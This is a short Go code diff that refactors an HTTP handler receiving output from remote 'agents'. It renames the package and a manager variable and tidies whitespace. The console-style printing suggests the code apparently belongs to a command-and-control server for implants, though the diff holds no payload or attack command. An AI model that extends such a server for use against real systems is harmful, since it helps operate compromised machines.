@@ -1,4 +1,4 @@
-package main
+package includes
 
 import (
 	"encoding/json"
@@ -24,7 +24,7 @@ func agent_response(w http.ResponseWriter, r *http.Request) {
 	}
 
 	// Get the agent from agentManager
-	agent, exists := agentManager.GetAgent(agent_id)
+	agent, exists := Manager.GetAgent(agent_id)
 	if !exists {
 		http.Error(w, "Agent not found", http.StatusNotFound)
 		return
@@ -50,7 +50,7 @@ func agent_response(w http.ResponseWriter, r *http.Request) {
 	if response.Output == "" {
 		fmt.Println("[-] Error: Empty response received.")
 	}
-	
+
 	// Log the received response
 	fmt.Printf("\n%s\n", response.Output)
 	PrintCursor()
